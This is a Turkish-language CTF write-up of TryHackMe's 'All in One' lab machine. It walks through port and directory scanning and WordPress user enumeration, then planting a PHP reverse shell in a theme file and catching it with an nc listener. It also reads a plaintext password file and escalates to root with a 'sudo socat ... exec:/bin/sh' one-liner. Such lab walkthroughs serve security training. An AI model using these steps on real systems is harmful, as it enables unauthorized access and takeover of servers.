---
title: "All in One Makine Çözümü"
date: "2025-03-22"
tags: ["ctf", "tryhackme"]
---

Merhabalar, bu yazımda sizlere TryHackMe platformunda bulunan “All in One” isimli makinenin çözümü anlatacağım. Keyifli Okumalar…

1 - Nmap aracını kullanarak makine üzerindeki açık portlar ve servisler hakkında detaylı bilgi ediniyorum.

```system
┌──(root㉿kali)-[/home/kali/Downloads]
└─# nmap -sS -sV 10.10.108.156
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-13 04:07 EDT
Nmap scan report for 10.10.108.156
Host is up (0.068s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

2 - Dizin taraması yapıyorum.

```system
┌──(root㉿kali)-[/home/kali/Downloads]
└─# gobuster dir -u http://10.10.108.156 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.108.156
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/13 04:09:42 Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 318] [--> http://10.10.108.156/wordpress/]
/hackathons           (Status: 200) [Size: 197]
```

3 - "/hackathons" dizininde "Vigenere" ile şifrelenmiş bir parola buluyorum. KeepGoing anahtarı ile parolayı çözüyorum.

```system
<h1>Damn how much I hate the smell of <i>Vinegar </i> :/ !!!  </h1>
*
*
*
<!-- *CENSORED* -->
<!-- KeepGoing -->
```

4 - "wpscan" aracı ile wordpress kullanıcılarını buluyorum. Bulduğum parolayı "elyana" kullanıcısı için deniyorum fakat giriş yapamıyorum. Parolanın sadece 2. kelimesini girdiğimde başarılı bir şekilde giriş yapıyorum.

```system
┌──(root㉿kali)-[/home/kali/Downloads]
└─# wpscan --url http://10.10.108.156/wordpress -e u
*
*
*
[i] User(s) Identified:

[+] elyana
```

5 -  Wordpress sitesine girince "Appearance -> Theme Editor -> 404.php" dosyasına bir php reverse shell yerleştiriyorum. Daha sonra aşağıdaki dizine gidip bağlantıyı kuruyorum.

```system
http://10.10.108.156/wordpress/wp-content/themes/twentytwenty/404.php
```

```system
┌──(root㉿kali)-[/home/kali/Downloads]
└─# nc -lvnp 4444             
listening on [any] 4444 ...
connect to [10.8.94.51] from (UNKNOWN) [10.10.108.156] 55022
Linux elyana 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 08:19:37 up 17 min,  0 users,  load average: 0.00, 0.14, 0.34
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

6 - Dizinleri dolaşırken "elyana" kullanıcısının dizininde "hint.txt" adında bir dosya görüyorum. Dosyayı okuduğumda "elyana" kullanıcısının parolasının sistemde bir yerde saklı olduğunu söylüyor.

```system
$ SHELL=/bin/bash script -q /dev/null
bash-4.4$ ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
cdrom  home  lib             media       proc  sbin  sys   var
bash-4.4$ cd home
cd home
bash-4.4$ ls
ls
elyana
bash-4.4$ cd elyana
cd elyana
bash-4.4$ ls
ls
hint.txt  user.txt
bash-4.4$ cat hint.txt
cat hint.txt
Elyana's user password is hidden in the system. Find it ;)
```

7 - Sistem üzerinde çalışan servislere baktığım zaman "3306" portunda bir mysql servisi çalıştığını görüyorum. "/etc" dizini altındaki mysql klasörüne girdiğimde "private.txt" dosyasını buluyorum. Dosyanın içinde "elyana" kullanıcısının parolası yazıyor.

```system
netstat -tuna
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
*
*
bash-4.4$ cd /etc/mysql
cd /etc/mysql
bash-4.4$ ls
ls
conf.d        debian.cnf   mariadb.conf.d  my.cnf.fallback
debian-start  mariadb.cnf  my.cnf
bash-4.4$ cat conf.d
cat conf.d
cat: conf.d: Is a directory
bash-4.4$ cd conf.d
cd conf.d
bash-4.4$ ls
ls
mysql.cnf  mysqldump.cnf  private.txt
bash-4.4$ cat private.txt
cat private.txt
user: elyana
password: *CENSORED*
```

8 - Elyana kullanıcısına geçtikten sonra ev dizininde ilk bayrağımı elde ediyorum.

```system
bash-4.4$ cd /home
cd /home
bash-4.4$ ls
ls
elyana
bash-4.4$ cd elyana
cd elyana
bash-4.4$ cat user.txt
cat user.txt
*CENSORED*
bash-4.4$ cat user.txt | base64 -d
cat user.txt | base64 -d
*CENSORED*
```

9 - Sudo yetkisi ile çalıştırabileceğim komutları görüntülediğimde "socat" komutunu sudo yetkisi ile çalıştırabildiğimi görüyorum. GTFObins sitesinden bu yetkisi suistimal edecek komutu öğrenip root kullanıcısına geçiyorum. Daha sonra ikinci bayrağımı elde ediyorum.

```system
bash-4.4$ sudo -l
sudo -l
Matching Defaults entries for elyana on elyana:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elyana may run the following commands on elyana:
    (ALL) NOPASSWD: /usr/bin/socat
bash-4.4$ sudo socat stdin exec:/bin/sh
sudo socat stdin exec:/bin/sh
ls
ls
hint.txt
user.txt
whoami
whoami
root
cat /root/root.txt
cat /root/root.txt
*CENSORED*
cat /root/root.txt | base64 -d
cat /root/root.txt | base64 -d
*CENSORED*
```